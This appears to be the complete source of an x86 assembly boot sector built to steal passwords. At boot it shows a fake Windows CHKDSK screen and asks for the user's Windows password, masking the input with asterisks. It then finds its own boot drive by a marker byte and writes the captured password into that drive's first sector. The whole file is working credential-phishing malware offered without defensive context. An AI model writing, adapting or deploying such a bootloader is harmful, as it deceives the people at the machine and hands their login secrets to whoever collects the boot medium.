[BITS 16]
[ORG 0x7C00]
jmp start
disknum db 0x99 ; now the first four bytes are E9 81 01 99 so we can find the disk later

%macro biosprint 1 ; This macro lets us print a message without manually loading
mov si, %1
call puts
%endmacro

; memory map
; 7C00 -> 7DFF = Code
; 7C00 -> 7DFF = 

puts: ; print string - expects that strings are terminated by a 0, and that SI po
  mov al, [si]
  cmp BYTE al, 0
  je exit
  inc si
  call putc
  jmp puts
  exit:
   ret

putc: ; Print a char to screen
 mov ah, 0x0E
 mov bh, 0x00
 mov bl, 0x11
 int 0x10
 ret

sleep:
 ;mov eax, dword 0xffffffff
 mov eax, 200
 top:
  cmp eax, 5
  jbe end
  dec eax
  jmp top
  end:
   ret

find_disk: ; assumes dl is the disk to read
 mov ah, 0x02 ; I want to read
 mov dh, 0x00 ; zeroeth head
 mov al, 0x01 ; I want to read one sector
 mov cx, 0x01 ; first sector, zero-eth track
 int 13h
 jc done_find_disk
  mov al, [0x8003]
  cmp al, 0x99
  jne done_find_disk
   mov BYTE [disknum], dl
   jmp done_find_disk
  done_find_disk:
   ret

; Declarations
checkfs db 'Windows CHKDSK', 13, 10, '==============', 13, 10, 13, 10, 'Checking file system on C:', 0
ntfs db 13, 10, 'The type of file system is NTFS.', 13, 10, 13, 10, 'One of your disks needs to be checked for consistency.', 13, 10, 13, 10,'Enter your Windows password to continue: ', 0
rmchar db 8,' ',8,0
checking db 13,10,13,10, 'Cheking volume C:', 13,10,'This may take a few minutes.',0
ya db 'ok!',0
no db 'no!',0
looking db 'looking', 13, 10, 0

start:
 mov ax, cs
 mov ax, 0
 mov ds, ax    ; This is because DS has a stupid value when it starts, so we just
 xor ax, ax
 mov es, ax

 biosprint checkfs
 call sleep
 biosprint ntfs

mov bp, 0x7E00; ; this is where we write our password, and will become the sector we write back
keep_zeroing:
 mov [bp], BYTE 0x00
 inc bp
 cmp bp, 0x7FFF ; 512 bytes from 0x7E00
 jb keep_zeroing

mov bp, 0x7E00
readchar:
 mov ah, 00h
 int 0x16
 cmp al, 13
 je done_password
 cmp al, 8
 je backspace
 mov [bp], BYTE al
 inc bp
 mov al, '*'
 call putc
 jmp loop
 backspace:
  biosprint rmchar
  mov [bp], BYTE 0x00
  dec bp
 loop:
  jmp readchar

done_password:
 biosprint checking

mov bx, 0x8000 ; write sector to this part of memory


mov dl, 0x00
call find_disk
mov dl, 0x01
call find_disk
mov dl, 0x80
call find_disk
mov dl, 0x81
call find_disk

cmp BYTE [disknum], 0x99
je end_find_disk
  mov ah, 0x03 ; I want to write
  mov al, 0x01 ; I want to read one sector
  mov ch, 0x00 ; zeroeth track
  mov cl, 0x01 ; first sector
  mov bx, 0x7E00
  mov dh, 0x00 ; zeroeth head
  mov dl, [disknum]
  int 13h
end_find_disk:

last:
 jmp $

times 510 - ($ - $$) db 0
dw 0xAA55
